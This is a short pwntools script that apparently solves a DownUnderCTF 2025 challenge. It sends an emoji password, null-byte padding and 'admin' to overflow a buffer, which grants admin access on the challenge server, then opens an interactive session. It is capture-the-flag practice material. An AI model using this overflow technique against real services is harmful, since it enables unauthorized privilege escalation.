from pwn import *

offset = 12
host = "chal.2025.ductf.net"
port = 30000

p = remote(host, port)

# password = b'\xf0\x9f\x87\xa6\xf0\x9f\x87\xa9\xf0\x9f\x87\xb2\xf0\x9f\x87\xae\xf0\x9f\x87\xb3' # 🇦🇩🇲🇮🇳 in hexadecimal

# smarter way is to just use encode :/
password = "🇦🇩🇲🇮🇳"
payload = password.encode('utf-8') + b"\x00" * offset + b"admin"

log.info(payload)

log.info(p.recv())
p.sendline('dummy')

log.info(p.recv())
p.sendline(payload)

p.interactive()
